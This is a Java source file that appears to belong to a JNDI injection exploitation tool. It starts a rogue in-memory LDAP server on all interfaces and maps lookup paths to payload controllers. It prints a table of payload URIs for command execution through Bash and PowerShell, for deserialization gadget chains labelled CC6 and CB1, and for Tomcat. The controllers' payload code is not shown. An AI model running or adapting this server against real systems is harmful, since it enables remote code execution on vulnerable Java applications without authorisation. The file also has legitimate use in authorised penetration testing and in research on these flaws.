package org.sec.core.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import de.vandermeer.asciitable.AsciiTable;
import de.vandermeer.asciitable.CWC_LongestLine;
import de.vandermeer.asciitable.CWC_LongestWordMax;
import de.vandermeer.skb.interfaces.transformers.textformat.TextAlignment;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.sec.Config;
import org.sec.util.ClassUtil;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.lang.reflect.Constructor;
import java.net.InetAddress;
import java.util.*;

public class LdapServer extends InMemoryOperationInterceptor {
    private static final Logger logger = LogManager.getLogger(LdapServer.class);
    private static final String LDAP_BASE = "dc=example,dc=com";
    private static final Map<String, LdapController> routes = new HashMap<>();

    public static void start(int port) {
        try {
            logger.info("start ldap server: 0.0.0.0:" + port);
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new LdapServer());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public LdapServer() throws Exception {
        String[] split = this.getClass().getPackage().getName().split("\\.");
        StringBuilder packageBuilder = new StringBuilder();
        for (int i = 0; i < split.length - 1; i++) {
            if (i < split.length - 2) {
                packageBuilder.append(split[i]);
                packageBuilder.append(".");
            } else {
                packageBuilder.append("controller");
            }
        }
        String packageName = packageBuilder.toString();
        List<Class<?>> controllers = ClassUtil.getClassesInPackage(packageName);

        AsciiTable table = new AsciiTable();

        table.addRule();
        table.addRow(Arrays.asList("LDAP Payload", "Introduce"));

        Map<String,LdapController> data = new HashMap<>();
        String ldapURI = String.format("ldap://%s:%s/", "0.0.0.0", Config.ldapPort);
        for (Class<?> controller : controllers) {
            Constructor<?> cons = controller.getConstructor();
            LdapController instance = (LdapController) cons.newInstance();
            String[] mappings = controller.getAnnotation(LdapMapping.class).uri();
            for (String mapping : mappings) {
                if (mapping.startsWith("/")) {
                    mapping = mapping.substring(1);
                }
                data.put(mapping,instance);
                routes.put(mapping, instance);
            }
        }
        table.addRule();
        table.addRow(Arrays.asList(ldapURI+"SimpleCommand",data.get("SimpleCommand").getInfo()));
        table.addRule();
        table.addRow(Arrays.asList(ldapURI+"BashCommand",data.get("BashCommand").getInfo()));
        table.addRule();
        table.addRow(Arrays.asList(ldapURI+"PowershellCommand",data.get("PowershellCommand").getInfo()));
        table.addRule();
        table.addRow(Arrays.asList(ldapURI+"CC6",data.get("CC6").getInfo()));
        table.addRule();
        table.addRow(Arrays.asList(ldapURI+"BashCC6",data.get("BashCC6").getInfo()));
        table.addRule();
        table.addRow(Arrays.asList(ldapURI+"PowershellCC6",data.get("PowershellCC6").getInfo()));
        table.addRule();
        table.addRow(Arrays.asList(ldapURI+"CB1",data.get("CB1").getInfo()));
        table.addRule();
        table.addRow(Arrays.asList(ldapURI+"BashCB1",data.get("BashCB1").getInfo()));
        table.addRule();
        table.addRow(Arrays.asList(ldapURI+"PowershellCB1",data.get("PowershellCB1").getInfo()));
        table.addRule();
        table.addRow(Arrays.asList(ldapURI+"Tomcat",data.get("Tomcat").getInfo()));
        table.addRule();
        table.addRow(Arrays.asList(ldapURI+"BashTomcat",data.get("BashTomcat").getInfo()));
        table.addRule();
        table.addRow(Arrays.asList(ldapURI+"PowershellTomcat",data.get("PowershellTomcat").getInfo()));
        table.addRule();
        table.getRenderer().setCWC(new CWC_LongestLine());
        String rend = table.render();
        System.out.println(rend);
    }

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String base = result.getRequest().getBaseDN();
        LdapController controller = null;
        for (String key : routes.keySet()) {
            if (key.equals(base)) {
                controller = routes.get(key);
                break;
            }
        }
        try {
            if (controller != null) {
                String output = "Accept " + result.getConnectedAddress() + " -----> " + base;
                logger.info(output);
                controller.sendResult(result, base);
            }
        } catch (Exception ignored) {
        }
    }
}